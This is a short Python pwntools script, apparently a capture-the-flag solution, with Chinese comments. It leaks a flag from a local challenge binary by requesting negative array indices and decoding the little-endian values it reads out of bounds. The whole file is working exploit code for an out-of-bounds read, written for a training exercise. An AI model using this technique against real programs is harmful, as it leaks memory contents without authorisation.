from pwn import *

context.log_level = "error"
flag = b""

# 从 -185 开始读取，循环遍历直到把整个 flag 读完
for i in range(-185, -170):
    p = process("/challenge/anomalous-array-easy")

    p.sendlineafter(b"Which number would you like to view?", str(i).encode())
    p.recvuntil(b"Your hacker number is ")

    # 获取十六进制字符串并去掉可能的回车符
    val = p.recvline().strip().decode()

    # 补齐 16 位 (8 bytes)，处理十六进制转换，并反转小端序 (Little-Endian)
    val = val.zfill(16)
    chunk = bytes.fromhex(val)[::-1]
    flag += chunk

    p.close()
    if b"}" in chunk:
        break

print(f"\n[+] Flag: {flag.decode('utf-8', errors='ignore')}")
